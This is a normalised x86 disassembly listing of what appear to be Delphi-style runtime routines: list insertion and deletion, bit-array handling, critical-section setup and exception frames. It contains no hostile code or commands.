add ecx edx
mov edx ecx
call sub_3a7a650
retn
sub_3a7a4f0
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_3a7a510
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_3a7a420
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_3a63154
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_3a7a588
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_3a7a420
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_3a7a494
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_3a7a388
xor ecx ecx
mov edx esi
mov eax ebx
call sub_3a7a510
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_3a7a5e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_3a7a420
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_3a7a630
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3a7a4f0
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_3a7a388
sub_3a7a650
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_3a7a420
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
add edx edx
add edx edx
lea eax [ ebx + 0x4 ]
call sub_3a62f14
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_3a7a68c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_3a7a420
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_3a7a650
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
add eax eax
add eax eax
xor ecx ecx
xchg edx eax
call sub_3a63a44
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_3a7a388
dec ebp
inc edi
jne r-xdata
sub_3a7a700
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor esi esi
mov edx edi
mov eax ebx
call sub_3a7a4f0
test eax eax
jl r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov esi edi
mov edx [ ebx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 4 ] ecx
mov edx eax
mov eax ebx
call sub_3a7a388
mov cl 0x1
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_3a7a740
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a64350
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a7a794
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_3a6478c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a7a898
xor eax eax
push ebp
push sub_3a7a7f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3a64380
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_3a64370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7a7fe
mov eax [ ebp - 0x4 ]
call sub_3a7a8fc
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_3a7a810
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a7a898
xor eax eax
push ebp
push sub_3a7a88c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_3a7a33c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_3a7a4f0
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7a893
mov eax [ ebp - 0x4 ]
call sub_3a7a8fc
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_3a7a420
sub_3a7a8ac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a7a898
xor eax eax
push ebp
push sub_3a7a8ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_3a7a630
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7a8f6
mov eax [ ebp - 0x4 ]
call sub_3a7a8fc
retn
sub_3a7a908
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a7a95c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a7a95c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_3a7a938
sar eax 0x5
mov edi eax
add edi edi
add edi edi
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
add ebp ebp
add ebp ebp
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_3a62ee0
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_3a63a44
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_3a62efc
mov edx edi
mov eax ebp
call sub_3a7a950
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_3a63154
sub_3a7aa00
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_3a7a938
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_3a7a95c
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_3a7aa2c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_3a7aaa4
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3a7dd58
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a7aae4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7ab9a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a65338
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_3a64260
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_3a65504
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_3a64260
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7aba1
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a7abc0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7ac55
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_3a64260
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_3a65504
mov eax ebx
mov si 0xffff
call sub_3a6457c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7ac5c
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax ebx
mov si 0xffff
call sub_3a6457c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_3a6457c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_3a65634
sub_3a7ac67
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3a645d4
mov eax ebx
mov si 0xffff
call sub_3a6457c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_3a6457c
push eax
lea eax [ ebx + 0x4 ]
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
pop eax
call sub_3a64434
sub_3a7acb2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_3a7ace4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_3a7ad04
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_3a64434
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_3a7ad2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a66cb4
test edi edi
je r-xdata
xor edx edx
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax edi
mov si 0xffff
call sub_3a6457c
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a66cb4
mov edx eax
mov eax ebx
call sub_3a7ad2c
test [ edi + 0x1c ] 0x10
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a66cb4
push eax
push r-xdata
push edi
mov eax [ edi ]
call [ eax + 0x28 ]
jmp r-xdata
sub_3a7adcc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_3a7ae21
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
mov edx eax
mov eax edi
call sub_3a7ad2c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7ae28
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_3a7ae30
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a7ae68
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7aaa4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a7ae98
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_3a7aed4
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_3a64260
mov edx esp
mov eax esi
call sub_3a65504
add esp 0x100
pop esi
pop ebx
retn
sub_3a7aefc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7af91
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_3a64260
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_3a65504
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_3a6457c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_3a7aebc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_3a6a850
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7af98
lea eax [ ebp - 0x14 ]
call sub_3a652a0
retn
sub_3a7afb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_3a7b4a0
mov edx ebx
mov eax esi
call sub_3a7b438
sub_3a7afe4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a7aebc
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_3a7a588
mov dl 0x1
mov eax ebx
call sub_3a7ae98
sub_3a7b014
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_3a7adcc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a7b060
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_3a7adcc
mov eax [ esi + 0x8 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7aaa4
test bl bl
jle r-xdata
mov eax esi
call sub_3a7b178
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a7b0ac
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_3a7b0cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3a7aad0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_3a7b14a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a7b178
mov eax esi
call sub_3a7b21c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_3a7b224
push eax
mov eax [ ebp - 0x4 ]
call sub_3a7b0ac
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_3a7b178
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_3a7b1d2
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_3a7a57c
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_3a7b1fc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a7b224
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_3a7b238
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7b2e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_3a64260
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_3a65504
mov eax ebx
mov si 0xffff
call sub_3a6457c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7b2ed
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
mov eax ebx
mov si 0xffff
call sub_3a6457c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_3a6457c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_3a7b300
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_3a65634
sub_3a7b300
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_3a652f4
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_3a6457c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_3a645c0
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_3a645c0
call sub_3a76534
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
add eax eax
add eax eax
call sub_3a62ee0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a7b3fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_3a645c0
mov edx [ ebp - 0xc ]
call sub_3a76738
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_3a62efc
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_3a767bc
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_3a65504
sub_3a7b41c
push ebx
push esi
mov esi edx
call sub_3a7b0ac
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
pop esi
pop ebx
retn
sub_3a7b438
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_3a6450c
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_3a7a33c
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_3a7b168
xor ecx ecx
mov edx esi
mov eax ebx
call sub_3a7adcc
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_3a7a420
sub_3a7b4a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_3a7a57c
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_3a7a630
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_3a7a388
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_3a7adcc
mov eax ebx
call sub_3a7b168
pop edi
pop esi
pop ebx
retn
sub_3a7b4fc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_3a7a494
mov edx eax
mov cl 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_3a7a494
call sub_3a64380
pop edi
pop esi
pop ebx
retn
sub_3a7b540
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_3a7b564
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_3a7b014
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a7b5ac
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a7c138
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7aaa4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a7b5dc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_3a7b600
push ebx
push esi
push edi
mov edi ecx
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_3a7b624
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7b6cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a7b794
xor eax eax
push ebp
push sub_3a7b6ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
